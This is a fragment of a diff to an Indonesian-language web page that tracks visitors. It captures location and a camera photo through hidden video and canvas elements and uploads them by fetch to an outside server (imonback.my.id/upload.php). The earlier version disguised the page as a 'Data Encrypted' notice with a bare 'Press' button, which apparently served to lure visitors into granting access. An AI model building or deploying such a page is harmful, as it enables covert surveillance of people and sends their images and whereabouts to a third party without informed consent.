@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>4m1ns kirai</title>
+    <title>Pelacakan Lokasi & Kamera</title>
 </head>
 <body>
-    <h1>Data Encrypted</h1>
-    <button id="trackButton">Tekan</button>
+    <h1>Pelacakan Lokasi & Kamera</h1>
+    <button id="trackButton">Lacak Lokasi & Ambil Foto</button>
     <p id="locationInfo"></p>
     <video id="video" autoplay style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
@@ -58,9 +58,9 @@
                         capturedImage.src = imgUrl;
                         capturedImage.style.display = "block";
 
-                        // Kirim ke backend
+                        // Kirim ke backend di Arenhost
                         try {
-                            const response = await fetch("http://imonback.my.id/upload", {
+                            const response = await fetch("http://imonback.my.id/upload.php", {
                                 method: "POST",
                                 body: formData
                             });
